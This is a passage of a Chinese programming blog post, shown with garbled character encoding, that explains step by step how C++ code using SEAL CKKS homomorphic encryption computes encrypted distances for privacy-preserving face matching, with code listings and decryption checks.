alt="image-20210203124920149"></p><p><strong>å°†åŠ å¯†çš„databseæ•°æ®åšè§£å¯†éªŒè¯:</strong></p><p><code>è¾“å‡ºå‰4è¡Œ:</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/79fdf547a5f97dac1206b302d34ad491.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/79fdf547a5f97dac1206b302d34ad491.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203130122350"></p><hr><h3 id="äºŒ-è®¡ç®—-mathbf-r-i-operatorname-dist-left-mathbf-p-mathbf-c-i-right-cdot-mathbf-k">äºŒ: è®¡ç®—   $\mathbf{r}<em>{i}=\operatorname{dist}\left(\mathbf{p}, \mathbf{c}</em>{i}\right) \cdot \mathbf{k}$</h3><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812102015.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812102015.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812102013754"></p><p>åˆ†æ­¥éª¤:</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812102035.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812102035.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812102034661"></p><p><strong>æ€»ä»£ç è°ƒç”¨:</strong></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> <span class="token function">get_dist</span><span class="token punctuation">(</span>SEALContext<span class="token operator">&amp;</span> context<span class="token punctuation">,</span>CKKSEncoder<span class="token operator">&amp;</span> ckks_encoder<span class="token punctuation">,</span> Evaluator<span class="token operator">&amp;</span> evaluator<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_E_matrix<span class="token punctuation">,</span> Ciphertext probe_p<span class="token punctuation">,</span>Encryptor <span class="token operator">&amp;</span> encryptor <span class="token punctuation">,</span>Decryptor<span class="token operator">&amp;</span> decryptor<span class="token punctuation">,</span> RelinKeys<span class="token operator">&amp;</span> relin_keys<span class="token punctuation">,</span>  GaloisKeys<span class="token operator">&amp;</span> galois_keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_dist() begin------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_R_matrix<span class="token punctuation">;</span>    <span class="token comment">/*    * get (Ci - Pi)^2    */</span>       cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sub &amp; square &amp;&amp; stored in encrypt_R_matrix: "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_R_matrix_cache <span class="token operator">=</span> <span class="token function">get_sub_square</span><span class="token punctuation">(</span>ckks_encoder<span class="token punctuation">,</span> evaluator<span class="token punctuation">,</span> decryptor<span class="token punctuation">,</span>encrypt_E_matrix<span class="token punctuation">,</span>probe_p<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*    * get sum    */</span>    encrypt_R_matrix <span class="token operator">=</span> <span class="token function">get_sum_rotate</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>ckks_encoder<span class="token punctuation">,</span>evaluator<span class="token punctuation">,</span>encryptor<span class="token punctuation">,</span> decryptor<span class="token punctuation">,</span> encrypt_R_matrix_cache<span class="token punctuation">,</span>galois_keys<span class="token punctuation">,</span>relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_dist() end------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> encrypt_R_matrix<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><h4 id="1ï¼šæ±‚-C-i-P-i-2">1ï¼šæ±‚ ${(C_{i} - P_{i})}^{2}$</h4><details green><summary> code </summary>              <div class='content'>              <pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> <span class="token function">get_sub_square</span><span class="token punctuation">(</span>CKKSEncoder<span class="token operator">&amp;</span> ckks_encoder<span class="token punctuation">,</span>Evaluator <span class="token operator">&amp;</span> evaluator<span class="token punctuation">,</span>Decryptor <span class="token operator">&amp;</span> decryptor<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_E_matrix<span class="token punctuation">,</span> Ciphertext probe_p<span class="token punctuation">,</span>RelinKeys <span class="token operator">&amp;</span> relin_keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_sub_square() begin------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_R_matrix<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> encrypt_E_matrix<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> encrypt_E_matrix<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        Plaintext plain_sub_cache<span class="token punctuation">,</span> plain_mult_cache<span class="token punctuation">;</span>        Ciphertext encrypt_sub_cache<span class="token punctuation">,</span> encrypt_multiply_cache<span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span>result_sub_cache<span class="token punctuation">,</span> result_mult_cache<span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span>probe_p<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span><span class="token punctuation">,</span> encrypt_sub_cache<span class="token punctuation">)</span><span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypt_sub_cache<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">square</span><span class="token punctuation">(</span>encrypt_sub_cache<span class="token punctuation">,</span> encrypt_multiply_cache<span class="token punctuation">)</span><span class="token punctuation">;</span>                evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypt_multiply_cache<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">rescale_to_next_inplace</span><span class="token punctuation">(</span>encrypt_multiply_cache<span class="token punctuation">)</span><span class="token punctuation">;</span>                 encrypt_R_matrix<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>encrypt_multiply_cache<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_sub_square() end------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> encrypt_R_matrix<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><strong>è§£ç ç»“æœéªŒè¯æµ‹è¯•ï¼š</strong></p><p>â€‹1. $(C_{i} - P_{i})$ç»“æœ:</p><p><img src="https://img-blog.csdnimg.cn/img_convert/7ed439628708bdf609879799603a99b6.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/7ed439628708bdf609879799603a99b6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203132236684"></p><ol start="2"><li><p>${(C_{i} - P_{i})}^{2}$ç»“æœ:</p><p><img src="https://img-blog.csdnimg.cn/img_convert/80cbecf334c48ea480b6a2258e6158d6.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/80cbecf334c48ea480b6a2258e6158d6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203133516381"></p></li></ol><hr><h4 id="2-sum-i-0-s-left-mathbf-c-i-mathbf-p-i-right-2">2:   $\sum_{i=0}<sup>{s}\left(\mathbf{c}_{i}-\mathbf{p}_{i}\right)</sup>{2}$</h4><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812102108.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812102108.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812102107289"></p><p><code>å¾ªç¯éå†encrypt_R_matrixï¼Œ å°†å¯†æ–‡æ¯æ¬¡ç§»ä½stepæ­¥ååŠ åˆ°encrypt_sum_cacheä¸Šå¾—åˆ°æœ€ç»ˆçš„ç»“æœï¼Œ</code></p><p><code>stepä»0åˆ°number-1</code></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> <span class="token function">get_sum_rotate</span><span class="token punctuation">(</span>SEALContext <span class="token operator">&amp;</span>context<span class="token punctuation">,</span>CKKSEncoder<span class="token operator">&amp;</span> ckks_encoder<span class="token punctuation">,</span> Evaluator<span class="token operator">&amp;</span> evaluator<span class="token punctuation">,</span>Encryptor <span class="token operator">&amp;</span>encryptor <span class="token punctuation">,</span>Decryptor<span class="token operator">&amp;</span> decryptor<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span>encrypt_R_matrix<span class="token punctuation">,</span>GaloisKeys <span class="token operator">&amp;</span> galois_keys<span class="token punctuation">,</span>RelinKeys <span class="token operator">&amp;</span> relin_keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_sum_rotate() begin------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_RR_matrix<span class="token punctuation">;</span>    <span class="token comment">/*    * get encryptor of vector K&#123;1,0,0,....0&#125;    * begin    */</span>    size_t slot_count <span class="token operator">=</span> ckks_encoder<span class="token punctuation">.</span><span class="token function">slot_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span><span class="token function">vector_k</span><span class="token punctuation">(</span>slot_count<span class="token punctuation">,</span> <span class="token number">0ULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vector_k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1ULL</span><span class="token punctuation">;</span>    <span class="token comment">//print_vector(vector_k, 3, 13);</span>    Plaintext plain_vector_k<span class="token punctuation">;</span>    Ciphertext encrypt_vector_k<span class="token punctuation">;</span>    ckks_encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>vector_k<span class="token punctuation">,</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plain_vector_k<span class="token punctuation">)</span><span class="token punctuation">;</span>    encryptor<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>plain_vector_k<span class="token punctuation">,</span> encrypt_vector_k<span class="token punctuation">)</span><span class="token punctuation">;</span>    evaluator<span class="token punctuation">.</span><span class="token function">mod_switch_to_next_inplace</span><span class="token punctuation">(</span>encrypt_vector_k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//end</span>    <span class="token comment">/*    *  Calculate begin    */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> encrypt_R_matrix<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> encrypt_R_matrix<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        Plaintext plain_rotated_cache<span class="token punctuation">,</span> plain_sum_cache<span class="token punctuation">;</span>        Ciphertext encrypt_rotated_cache<span class="token punctuation">,</span> encrypt_sum_cache<span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span>result_rotated_cache<span class="token punctuation">,</span> result_sum_cache<span class="token punctuation">;</span>        encrypt_sum_cache <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*        * rotated &amp; add to get sum of them        */</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> number_n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            evaluator<span class="token punctuation">.</span><span class="token function">rotate_vector</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> galois_keys<span class="token punctuation">,</span> encrypt_rotated_cache<span class="token punctuation">)</span><span class="token punctuation">;</span>            encrypt_sum_cache <span class="token operator">=</span> encrypt_rotated_cache<span class="token punctuation">;</span>            evaluator<span class="token punctuation">.</span><span class="token function">add_inplace</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>            evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        evaluator<span class="token punctuation">.</span><span class="token function">multiply_inplace</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">,</span> encrypt_vector_k<span class="token punctuation">)</span><span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">,</span> relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>        evaluator<span class="token punctuation">.</span><span class="token function">rescale_to_next_inplace</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">)</span><span class="token punctuation">;</span>        encrypt_RR_matrix<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*    *  Calculate end;    */</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_sum_rotate() end------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> encrypt_RR_matrix<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><strong>è§£ç ç»“æœéªŒè¯æµ‹è¯•(éƒ¨åˆ†æˆªå–):</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/359941312c960414e49adc41b215b76b.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/359941312c960414e49adc41b215b76b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203140928407"></p><hr><h4 id="3-æ±‚-operatorname-dist-left-mathbf-p-mathbf-c-i-right-cdot-mathbf-k">3: æ±‚ $\operatorname{dist}\left(\mathbf{p}, \mathbf{c}_{i}\right) \cdot \mathbf{k}$</h4><p><strong>ä»£ç å†…åµŒåœ¨ç¬¬äºŒæ­¥æ±‚ 2:   $\sum_{i=0}<sup>{s}\left(\mathbf{c}_{i}-\mathbf{p}_{i}\right)</sup>{2}$â€‹ä¸­</strong></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812102210.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812102210.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812102208665"></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">evaluator<span class="token punctuation">.</span><span class="token function">multiply_inplace</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">,</span> encrypt_vector_k<span class="token punctuation">)</span><span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">rescale_to_next_inplace</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">)</span><span class="token punctuation">;</span>encrypt_RR_matrix<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>encrypt_sum_cache<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è§£ç ç»“æœéªŒè¯:</p><img src="https://gitee.com/sizaif/images/raw/master/img/20210203140007.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210203140007.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203140007458"  /><hr><h3 id="ä¸‰-å°†å¾—åˆ°-R-è¿›è¡Œç§»ä½å åŠ æ“ä½œ">ä¸‰: å°†å¾—åˆ° R è¿›è¡Œç§»ä½å åŠ æ“ä½œ:</h3><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812102121.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812102121.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812102120353"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> <span class="token function">get_shifting_ri</span><span class="token punctuation">(</span>SEALContext<span class="token operator">&amp;</span> context<span class="token punctuation">,</span>CKKSEncoder<span class="token operator">&amp;</span> ckks_encoder<span class="token punctuation">,</span>Evaluator<span class="token operator">&amp;</span> evaluator<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_R_matrix<span class="token punctuation">,</span> GaloisKeys<span class="token operator">&amp;</span> galois_keys<span class="token punctuation">,</span> Decryptor<span class="token operator">&amp;</span> decryptor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_shifting_ri() begin------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_RR_matrix<span class="token punctuation">;</span>    Plaintext plain_shift_cache<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span>result_shift_cache<span class="token punctuation">;</span>        <span class="token keyword">int</span> step <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> encrypt_R_matrix<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> encrypt_R_matrix<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        Ciphertext after_shift<span class="token punctuation">;</span>        <span class="token comment">// å³ç§»</span>        evaluator<span class="token punctuation">.</span><span class="token function">rotate_vector</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span><span class="token punctuation">,</span>step<span class="token punctuation">,</span> galois_keys<span class="token punctuation">,</span>after_shift<span class="token punctuation">)</span><span class="token punctuation">;</span>        step<span class="token operator">--</span><span class="token punctuation">;</span>        encrypt_RR_matrix<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>after_shift<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_shifting_ri() end------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> encrypt_RR_matrix<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><strong>è§£ç ç»“æœéªŒè¯æµ‹è¯•ï¼›</strong></p><p><code>è¾“å‡ºå‰10åˆ—å‰10è¡Œï¼Œ ä¿ç•™13ä½å°æ•°</code></p><img src="https://gitee.com/sizaif/images/raw/master/img/20210203162006.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210203162006.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203162006063" style="zoom:200%;" /><hr><h3 id="å››-å°†å¾—åˆ°-R-left-mathbf-r-1-1-mathbf-r-2-1-ldots-mathbf-r-N-1-right">å››: å°†å¾—åˆ° $R-&gt;\left(\mathbf{r}<em>{1,1}, \mathbf{r}</em>{2,1}, \ldots \mathbf{r}_{N, 1}\right)$:</h3><p>é€šè¿‡ç§»ä½æ“ä½œå¾—åˆ°å¯¹è§’çŸ©é˜µåï¼Œå°†æ‰€æœ‰çš„$C_{i}$â€‹ ç´¯åŠ èµ·æ¥å¾—åˆ°$R-&gt;\left(\mathbf{r}<em>{1,1}, \mathbf{r}</em>{2,1}, \ldots \mathbf{r}_{N, 1}\right)$:</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812102140.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812102140.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812102139359"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-cpp" data-language="cpp"><code class="language-cpp">Ciphertext <span class="token function">get_combined_R</span><span class="token punctuation">(</span>SEALContext<span class="token operator">&amp;</span> context<span class="token punctuation">,</span>CKKSEncoder<span class="token operator">&amp;</span> ckks_encoder<span class="token punctuation">,</span>Evaluator<span class="token operator">&amp;</span> evaluator<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>Ciphertext<span class="token operator">></span> encrypt_R_matrix<span class="token punctuation">,</span> Encryptor<span class="token operator">&amp;</span> encryptor<span class="token punctuation">,</span> Decryptor<span class="token operator">&amp;</span> decryptor<span class="token punctuation">,</span> RelinKeys<span class="token operator">&amp;</span> relin_keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_combined_R() begin------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        Ciphertext encrypt_R_sum_cache<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">" combined together: "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">int</span> step <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> encrypt_R_matrix<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> encrypt_R_matrix<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>step <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            encrypt_R_sum_cache <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>            step<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            parms_id_type last_parms_id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parms_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            evaluator<span class="token punctuation">.</span><span class="token function">add_inplace</span><span class="token punctuation">(</span>encrypt_R_sum_cache<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">*</span>it<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            evaluator<span class="token punctuation">.</span><span class="token function">relinearize_inplace</span><span class="token punctuation">(</span>encrypt_R_sum_cache<span class="token punctuation">,</span>relin_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>            step<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"------get_combined_R() end------"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> encrypt_R_sum_cache<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><strong>è§£å¯†ç»“æœæµ‹è¯•:</strong></p><p><img src="https://img-blog.csdnimg.cn/img_convert/eb2e7a41898c866db7ebd12df2fae661.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/eb2e7a41898c866db7ebd12df2fae661.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210203183212079"></p><hr><h3 id="æœ€ç»ˆç»“æœå±•ç¤º">æœ€ç»ˆç»“æœå±•ç¤º</h3><p>==æ³¨æ„ï¼==</p><p><code>(å› ä¸ºæ²¡æœ‰ç”¨FaceNetç¼˜æ•…,è¿™é‡Œç»™å®šçš„é˜ˆå€¼ t ä¸å¾—çŸ¥ï¼Œæ•…ç¨‹åºåªè¿è¡Œåˆ°å°†Råšå®Œå¯¹è§’åŒ–åå¹¶åŠ åœ¨ä¸€èµ·å˜æˆä¸€ä¸ª</code></p><p>$R-&gt;(r1,1, r2,1, . . . rN,1).$å½¢å¼</p><p><code>è‹¥ç»™å®šçš„è®¾å®šçš„tå·²çŸ¥; åˆ™åªéœ€è¦åšå¦‚ä¸‹æ“ä½œåˆ¤å®šç»“æœ:</code></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// d = R - t</span>Ciphertext encrypt_T<span class="token punctuation">,</span>encrypt_d<span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span>mapping_R<span class="token punctuation">,</span>encrypt_T<span class="token punctuation">,</span>encrypt_d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// *d = Dec(d)</span>Plaintext plain_dd_cache<span class="token punctuation">;</span>vector<span class="token 